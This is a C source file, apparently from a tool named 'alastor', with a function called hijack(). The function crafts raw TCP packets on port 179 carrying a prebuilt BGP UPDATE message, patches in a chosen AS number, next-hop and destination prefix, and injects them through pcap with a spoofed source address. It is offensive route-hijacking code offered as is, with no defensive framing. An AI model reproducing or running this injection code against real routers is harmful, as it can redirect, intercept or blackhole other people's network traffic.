#include "alastor.h"

bool hijack(pcap_t* handle, uint8_t* target, uint8_t* odest, uint8_t* lip, uint16_t asn, uint8_t* gateway, uint32_t seq) {
	u_char pkt[100];
	ether_header* eth = (ether_header*)pkt;
	ip_hdr* ip = (ip_hdr*)&pkt[sizeof ether_header];
	tcp_hdr* tcp = (tcp_hdr*)&pkt[sizeof ether_header + sizeof ip_hdr];

	memcpy(eth->src, gateway, 6);
	memcpy(eth->dest, gateway, 6);
	eth->type = htons(0x0800);

	ip->ver = 4;
	ip->ihl = sizeof ip_hdr / sizeof ULONG;
	ip->dscp = 0;
	ip->ecn = 1;
	ip->len = htons(sizeof ip_hdr + sizeof tcp_hdr + 46);
	ip->id = 0;
	ip->flags = 0;
	ip->fOff = 0;
	ip->ttl = 128;
	ip->proto = IPPROTO_TCP;
	ip->csum = 0;
	memcpy(ip->src, lip, 4);
	memcpy(ip->dest, target, 4);
	ip->csum = checksum((USHORT*)ip, sizeof ip_hdr);

	tcp->src_port = htons(179);
	tcp->dst_port = htons(179);
	tcp->seq = htonl(seq);
	tcp->ack_seq = 0;
	tcp->doff = 5;
	tcp->res1 = 0;
	tcp->cwr = 0;
	tcp->ece = 0;
	tcp->urg = 0;
	tcp->ack = 0;
	tcp->psh = 0;
	tcp->rst = 0;
	tcp->syn = 0;
	if (seq == 1) {
		tcp->syn = 1;
	}
	tcp->fin = 0;
	tcp->window_size = htons(155);
	tcp->checksum = 0;
	tcp->urgent_p = 0;

	memcpy(&pkt[sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr], bgp_update_prebuilt, 46);
	memcpy(&pkt[sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr + 32], &asn, 2);
	memcpy(&pkt[sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr + 37], lip, 4);
	memcpy(&pkt[sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr + 42], odest, 4);
	return (pcap_sendpacket(handle, pkt, sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr + 46) != -1);
}
